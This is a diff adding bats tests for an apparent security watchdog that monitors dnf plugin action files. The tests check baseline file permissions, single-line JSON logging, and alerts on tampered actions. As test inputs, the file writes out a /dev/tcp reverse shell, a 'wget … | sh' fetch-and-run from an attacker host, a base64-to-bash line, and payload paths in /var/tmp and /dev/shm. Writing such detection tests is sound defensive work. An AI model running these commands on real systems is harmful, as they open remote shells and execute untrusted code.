@@ -151,3 +151,70 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — dnf-plugins inventory enumerates post-transaction root-exec surface)" {
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in action → alert" {
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    printf '*:in:bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ACTION}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in action → alert" {
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    printf '*:in:wget -qO- http://attacker/p | sh\n' > "${ACTION}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe): obfuscation variant in action → alert" {
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    printf '*:in:echo YmFzaCAtaQ== | base64 -d | bash\n' > "${ACTION}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (action under /var/tmp writable root): expands writable-root coverage" {
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    printf '*:in:/var/tmp/.payload\n' > "${ACTION}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (action under /dev/shm): tmpfs-root payload coverage" {
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    printf '*:in:/dev/shm/.payload\n' > "${ACTION}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable action file → alert; the file ITSELF, not just contents)" {
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    chmod 0666 "${ACTION}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-dnf-plugins -- ')
+    [ "${main_count}" = "1" ]
+}
